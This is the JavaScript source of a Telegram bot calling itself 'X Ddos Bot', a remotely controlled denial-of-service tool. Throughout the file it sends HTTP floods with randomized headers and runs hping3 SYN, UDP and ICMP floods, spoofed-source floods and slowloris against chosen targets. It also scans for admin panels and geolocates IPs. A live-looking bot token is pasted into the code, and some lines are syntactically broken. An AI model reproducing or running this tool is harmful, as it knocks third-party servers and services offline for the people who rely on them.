require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const fetch = require('node-fetch');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const bot = new Telegraf(process.env.7991511524:AAE1ReD73oQ7p8MRhLtj8UQZf8FxTA1OeG0);
const ownerId = process.env.7264431734; // Set OWNER_ID di file .env
let authorizedUsers = process.env.AUTHORIZED_USERS ? process.env.AUTHORIZED_USERS.split(',') : [ownerId];

let isAttackRunning = false;
let attackTargets = [];
let maxProcs = 5000;
let sentPackets = 0;
let isServerDown = false;
let downNotificationSent = false;

const logFile = path.join(__dirname, 'bot.log');

function log(message) {
  const timestamp = new Date().toISOString();
  const logMessage = `[${timestamp}] ${message}\n`;
  fs.appendFileSync(logFile, logMessage);
  console.log(logMessage);
}

const headersUseragents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
  "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
];

const headersReferers = [
  "http://www.google.com/?q=",
  "http://www.bing.com/search?q=",
  "http://search.yahoo.com/search?p=",
];

function buildblock(size) {
  return Array.from({ length: size }, () => String.fromCharCode(Math.floor(Math.random() * 26) + 65)).join('');
}

async function httpCall(url) {
  const paramJoiner = url.includes('?') ? '&' : '?';
  const randomQuery = buildblock(Math.floor(Math.random() * 7) + 3) + '=' + buildblock(Math.floor(Math.random() * 7) + 3);
  const fullUrl = url + paramJoiner + randomQuery;

  try {
    const response = await fetch(fullUrl, {
      method: 'GET',
      headers: {
        'User-Agent': headersUseragents[Math.floor(Math.random() * headersUseragents.length)],
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Referer': headersReferers[Math.floor(Math.random() * headersReferers.length)] + buildblock(Math.floor(Math.random() * 5) + 5),
        'Keep-Alive': (Math.floor(Math.random() * 10) + 100).toString(),
        'Connection': 'keep-alive'
      }
    });

    if (response.status >= 500) {
      if (!downNotificationSent) {
        isServerDown = true;
        bot.telegram.sendMessage(ownerId, `🚨 *Server ${url} is down!* \nStatus code: \`${response.status}\``, { parse_mode: 'Markdown' });
        downNotificationSent = true;
      }
      return 'down';
    }

    sentPackets++;
    return 'ok';
  } catch (error) {
    if (!downNotificationSent) {
      isServerDown = true;
      bot.telegram.sendMessage(ownerId, `🚨 *Server ${url} is down!* \nError: \`${error.message}\``, { parse_mode: 'Markdown' });
      downNotificationSent = true;
    }
    return 'error';
  }
}
bot.command('attack', (ctx) => {
       if (!authorizedUsers.includes(ctx.from.id.toString())) {
         return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
       }

       ctx.reply('🌐 *Enter the target URLs (separated by space):*', { parse_mode: 'Markdown' });

       // Listen for the user's input
       bot.on('text', async (ctx) => {
         const targets = ctx.message.text.trim().split(' ');

         // Validate each target URL
         const invalidTargets = targets.filter(target => !isValidUrl(target));
         if (invalidTargets.length > 0) {
           return ctx.reply(`❌ *Invalid URLs detected: ${invalidTargets.join(', ')}*`, { parse_mode: 'Markdown' });
         }

         // Set attack targets
         attackTargets = targets;

         // Ask for attack method
         ctx.reply('⚔️ *Choose attack method:*', {
           parse_mode: 'Markdown',
           ...Markup.inlineKeyboard([
             [Markup.button.callback('HTTP Flood', 'method_http')],
             [Markup.button.callback('Slowloris', 'method_slowloris')],
           ])
         });
       });
     });
     
     

function startIpAttack(ip, method) {
  isAttackRunning = true;
  isServerDown = false;
  sentPackets = 0;
  downNotificationSent = false;

  let command;
  switch (method) {
    case 'flood':
      command = `ping -f ${ip}`;
      break;
    case 'killssh':
      command = `hping3 -S -p 22 --flood -V ${ip}`;
      break;
    case 'rapidreset':
      command = `hping3 --udp --flood -V ${ip}`;
      break;
    case 'synflood':
      command = `hping3 -S --flood -V ${ip}`;
      break;
    case 'udpflood':
      command = `hping3 --udp --flood -V ${ip}`;
      break;
    case 'icmpflood':
      command = `hping3 --icmp --flood -V ${ip}`;
      break;
    case 'bypass':
      command = `hping3 --rand-source --flood -V ${ip}`;
      break;
    case 'httpflood':
      command = `hping3 --syn --flood -V -p 80 ${ip}`;
      break;
    case 'slowloris':
      command = `slowloris -dns ${ip}`;
      break;
    default:
      command = `ping -f ${ip}`;
  }

  exec(command, (error, stdout, stderr) => {
    if (error) {
      bot.telegram.sendMessage(ownerId, `❌ *IP attack on ${ip} failed!* \nError: \`${error.message}\``, { parse_mode: 'Markdown' });
      return;
    }
    if (stderr) {
      bot.telegram.sendMessage(ownerId, `⚠️ *IP attack on ${ip} stderr:* \`${stderr}\``, { parse_mode: 'Markdown' });
      return;
    }
    bot.telegram.sendMessage(ownerId, `⚡ *IP attack on ${ip} started using ${method} method!*`, { parse_mode: 'Markdown' });
  });
}

async function startAttack(urls, method) {
  isAttackRunning = true;
  isServerDown = false;
  sentPackets = 0;
  downNotificationSent = false;
  let activeRequests = 0;

  while (isAttackRunning) {
    if (activeRequests < maxProcs) {
      activeRequests++;
      urls.forEach(url => {
        if (method === 'http') {
          httpCall(url).then((result) => {
            activeRequests--;
            if (result === 'down') {
              if (!downNotificationSent) {
                bot.telegram.sendMessage(ownerId, `🚨 *Server ${url} is down!* \nContinuing attack...`, { parse_mode: 'Markdown' });
                downNotificationSent = true;
              }
            }
          }).catch(() => {
            activeRequests--;
          });
        } else if (method === 'slowloris') {
          // Implement Slowloris attack here
        }
      });
    }
    await new Promise(resolve => setTimeout(resolve, 10));
  }

  bot.telegram.sendMessage(ownerId, `🛑 *Attack manually stopped!* \nTotal packets sent: \`${sentPackets}\``, { parse_mode: 'Markdown' });
}

// Fungsi untuk mendapatkan informasi IP
async function getIpInfo(ip) {
  const url = `http://ip-api.com/json/${ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query`;

  try {
    const response = await fetch(url);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Error fetching IP info:', error);
    return null;
  }
}

// Fungsi untuk validasi URL
function isValidUrl(url) {
  try {
    new URL(url);
    return true;
  } catch (error) {
    return false;
  }
}

// Fungsi untuk validasi IP
function isValidIp(ip) {
  const ipPattern = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return ipPattern.test(ip);
}

// Fungsi untuk mencari kerentanan di web
async function findVulnerabilities(url) {
  try {
    const response = await fetch(url);
    const html = await response.text();

    // Contoh sederhana untuk mencari kerentanan XSS
    if (html.includes('<script>alert')) {
      return '⚠️ *Potential XSS vulnerability found!*';
    }

    // Contoh sederhana untuk mencari kerentanan SQL Injection
    if (html.includes('SQL syntax')) {
      return '⚠️ *Potential SQL Injection vulnerability found!*';
    }

    return '✅ *No obvious vulnerabilities found.*';
  } catch (error) {
    return `❌ *Error scanning for vulnerabilities: ${error.message}*`;
  }
}

// Fungsi untuk mencari admin panel
async function findAdminPanel(url) {
  const commonAdminPaths = [
    '/admin', '/admin/login', '/adminpanel', '/wp-admin', '/wp-login.php', '/administrator', '/login', '/cpanel', '/panel'
  ];

  try {
    for (const path of commonAdminPaths) {
      const adminUrl = `${url}${path}`;
      const response = await fetch(adminUrl);

      if (response.status === 200) {
        return `🔍 *Admin panel found at: ${adminUrl}*`;
      }
    }

    return '🔍 *No admin panel found.*';
  } catch (error) {
    return `❌ *Error searching for admin panel: ${error.message}*`;
  }
}

// Fungsi untuk merestart bot dan terminal
function restartBot() {
  log('Restarting bot and terminal...');
  exec('killall node && node bot.js', (error, stdout, stderr) => {
    if (error) {
      log(`Error restarting bot: ${error.message}`);
      return;
    }
    if (stderr) {
      log(`Stderr: ${stderr}`);
      return;
    }
    log(`Bot restarted successfully: ${stdout}`);
  });
}

// /start command
bot.command('start', async (ctx) => {
  const videoUrl = 'https://files.catbox.moe/p1n19r.mp4';
  const helpMessage = `
 *Welcome to X Ddos Bot!* 🚀
*I was created by Xbibz Developer🦠*

Here are the available commands:

⚔️ /attack - Start an aggressive attack on target URLs.
🌐 /attackip - Start an IP attack on target IPs.
🛑 /stop - Stop the ongoing attack.
📊 /stats - Show the total packets sent during the attack.
🔄 /restart - Restart the bot and terminal.
👑 /addown - Add a new owner.
👑 /delown - Remove an owner.
👑 /listown - List all owners.
🔍 /checkip - Check IP information for a website or IP.
⚙️ /setmaxprocs - Set the maximum number of concurrent processes.
🔐 /scanvuln - Scan a website for vulnerabilities.
🔑 /adminfinder - Find admin panel of a website.
  `;

  await ctx.replyWithVideo(videoUrl, { caption: helpMessage, parse_mode: 'Markdown', ...Markup.inlineKeyboard([
    [Markup.button.callback('Flood', 'method_flood')],
    [Markup.button.callback('Kill SSH', 'method_killssh')],
    [Markup.button.callback('Rapid Reset', 'method_rapidreset')],
    [Markup.button.callback('SYN Flood', 'method_synflood')],
    [Markup.button.callback('UDP Flood', 'method_udpflood')],
    [Markup.button.callback('ICMP Flood', 'method_icmpflood')],
    [Markup.button.callback('Bypass', 'method_bypass')],
    [Markup.button.callback('HTTP Flood', 'method_httpflood')],
    [Markup.button.callback('Slowloris', 'method_slowloris')],
  ])});
});

// /restart command
bot.command('restart', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply('🔄 *Restarting bot and terminal...*', { parse_mode: 'Markdown' });
  restartBot();
});

// /stop command
bot.command('stop', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  isAttackRunning = false;
  ctx.reply('🛑 *Attack stopped!*', { parse_mode: 'Markdown' });
});

// /addown command
bot.command('addown', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  const newOwnerId = ctx.message.text.split(' ')[1];
  if (!newOwnerId) {
    return ctx.reply('❌ *Please provide a user ID to add as owner.*', { parse_mode: 'Markdown' });
  }

  authorizedUsers.push(newOwnerId);
  ctx.reply(`✅ *User ${newOwnerId} added as owner.*`, { parse_mode: 'Markdown' });
});

// /delown command
bot.command('delown', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  const ownerIdToRemove = ctx.message.text.split(' ')[1];
  if (!ownerIdToRemove) {
    return ctx.reply('❌ *Please provide a user ID to remove from owners.*', { parse_mode: 'Markdown' });
  }

  authorizedUsers = authorizedUsers.filter(id => id !== ownerIdToRemove);
  ctx.reply(`✅ *User ${ownerIdToRemove} removed from owners.*`, { parse_mode: 'Markdown' });
});

// /listown command
bot.command('listown', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply(`👑 *List of owners:*\n${authorizedUsers.join('\n')}`, { parse_mode: 'Markdown' });
});

// /checkip command
bot.command('checkip', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply('🌐 *Enter the target URL or IP to check:*', { parse_mode: 'Markdown' });
  bot.on('text', async (ctx) => {
    const target = ctx.message.text.trim();
    let ip;

    if (isValidUrl(target)) {
      try {
        const url = new URL(target);
        ip = url.hostname;
      } catch (error) {
        return ctx.reply('❌ *Invalid URL. Please enter a valid URL.*', { parse_mode: 'Markdown' });
      }
    } else if (isValidIp(target)) {
      ip = target;
    } else {
      return ctx.reply('❌ *Invalid input. Please enter a valid URL or IP.*', { parse_mode: 'Markdown' });
    }

    ctx.reply('🔍 *Choose IP check option:*', {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('Basic Info', `ipinfo_basic_${ip}`)],
        [Markup.button.callback('Full Info', `ipinfo_full_${ip}`)],
      ])
    });
  });
});

// /stats command
bot.command('stats', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply(`📊 *Total packets sent: \`${sentPackets}\`*`, { parse_mode: 'Markdown' });
});

// /setmaxprocs command
bot.command('setmaxprocs', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  const newMaxProcs = parseInt(ctx.message.text.split(' ')[1]);
  if (isNaN(newMaxProcs)) {
    return ctx.reply('❌ *Please provide a valid number for max processes.*', { parse_mode: 'Markdown' });
  }

  maxProcs = newMaxProcs;
  ctx.reply(`✅ *Max processes set to ${maxProcs}*`, { parse_mode: 'Markdown' });
});

// /scanvuln command
bot.command('scanvuln', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply('🌐 *Enter the target URL to scan for vulnerabilities:*', { parse_mode: 'Markdown' });
  bot.on('text', async (ctx) => {
    const url = ctx.message.text.trim();
    if (!isValidUrl(url)) {
      return ctx.reply('❌ *Invalid URL. Please enter a valid URL.*', { parse_mode: 'Markdown' });
    }

    const result = await findVulnerabilities(url);
    ctx.reply(result, { parse_mode: 'Markdown' });
  });
});

// /adminfinder command
bot.command('adminfinder', (ctx) => {
  if (!authorizedUsers.includes(ctx.from.id.toString())) {
    return ctx.reply('❌ *You are not authorized to use this command.*', { parse_mode: 'Markdown' });
  }

  ctx.reply('🌐 *Enter the target URL to find admin panel:*', { parse_mode: 'Markdown' });
  bot.on('text', async (ctx) => {
    const url = ctx.message.text.trim();
    if (!isValidUrl(url)) {
      return ctx.reply('❌ *Invalid URL. Please enter a valid URL.*', { parse_mode: 'Markdown' });
    }

    const result = await findAdminPanel(url);
    ctx.reply(result, { parse_mode: 'Markdown' });
  });
});

// Handle inline keyboard callback untuk cek IP
bot.action(/ipinfo_(.+)_(.+)/, async (ctx) => {
  const type = ctx.match[1]; // basic atau full
  const ip = ctx.match[2]; // IP atau hostname

  const ipInfo = await getIpInfo(ip);
  if (!ipInfo || ipInfo.status !== 'success') {
    return ctx.reply('❌ *Failed to fetch IP information.*', { parse_mode: 'Markdown' });
  }

  let message;
  if (type === 'basic') {
    message = `🌐 Basic IP Information for ${ip}:*\n
- Country: ${ipInfo.country} (${ipInfo.countryCode})
- Region: ${ipInfo.regionName} (${ipInfo.region})
- City: ${ipInfo.city}
- ISP: ${ipInfo.isp}
- Organization: ${ipInfo.org}`;
  } else if (type === 'full') {
    message = `🌐 *Full IP Information for ${ip}:*\n
- Continent: ${ipInfo.continent} (${ipInfo.continentCode})
- Country: ${ipInfo.country} (${ipInfo.countryCode})
- Region: ${ipInfo.regionName} (${ipInfo.region})
- City: ${ipInfo.city}
- District: ${ipInfo.district}
- ZIP: ${ipInfo.zip}
- Latitude: ${ipInfo.lat}
- Longitude: ${ipInfo.lon}
- Timezone: ${ipInfo.timezone}
- Offset: ${ipInfo.offset}
- Currency: ${ipInfo.currency}
- ISP: ${ipInfo.isp}
- Organization: ${ipInfo.org}
- AS: ${ipInfo.as}
- AS Name: ${ipInfo.asname}
- Reverse DNS: ${ipInfo.reverse}
- Mobile: ${ipInfo.mobile ? 'Yes' : 'No'}
- Proxy: ${ipInfo.proxy ? 'Yes' : 'No'}
- Hosting: ${ipInfo.hosting ? 'Yes' : 'No'}`;
  }

  ctx.reply(message, { parse_mode: 'Markdown' });
});

// Handle callback query untuk metode serangan
bot.action(/method_(.+)/, (ctx) => {
  const method = ctx.match[1]; // Mendapatkan metode dari callback data
  if (!attackTargets.length) {
    return ctx.reply('❌ *No target set. Please set targets first.*', { parse_mode: 'Markdown' });
  }

  if (attackTargets.every(target => isValidUrl(target))) {
    startAttack(attackTargets, method);
  } else if (attackTargets.every(target => isValidIp(target))) {
    attackTargets.forEach(ip => startIpAttack(ip, method));
  } else {
    return ctx.reply('❌ *Invalid targets. Please check your inputs.*', { parse_mode: 'Markdown' });
  }

  ctx.reply(`⚡ *Attack started using ${method} method!*`, { parse_mode: 'Markdown' });
});

// Auto-restart on crash
process.on('uncaughtException', (error) => {
  log(`Uncaught Exception: ${error.message}`);
  bot.stop();
  bot.launch();
});

process.on('unhandledRejection', (reason, promise) => {
  log(`Unhandled Rejection at: ${promise}, reason: ${reason}`);
  bot.stop();
  bot.launch();
});

bot.launch();

console.log('Bot is running...');
